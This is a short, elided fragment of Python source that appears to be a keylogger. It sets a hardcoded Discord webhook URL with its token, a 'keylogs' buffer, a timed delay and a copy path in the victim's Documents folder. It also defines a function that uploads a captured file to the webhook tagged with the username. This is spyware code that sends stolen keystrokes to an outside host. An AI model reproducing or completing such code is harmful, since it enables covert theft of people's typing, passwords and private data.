...
import sys
# Example usage:
webhook_url = 'https://discord.com/api/webhooks/1188180601996587168/YKw8ZWYZqyPaYoCAMmnRJsFCUMryzLJvVh81Vg2Xr5r-G-UeCewQssrAmsrUW20pU3fv'
keylogs_str = ""
delay_duration = 300  # Set the delay duration in seconds
...
destination_path = f'C:/Users/{username}/Documents/{file_name}'
...
def send_webhook_with_file(webhook_url, file_path): #Send to discord file
    with open(file_path, 'rb') as file:
        payload = {"content": f"User: {username}"}
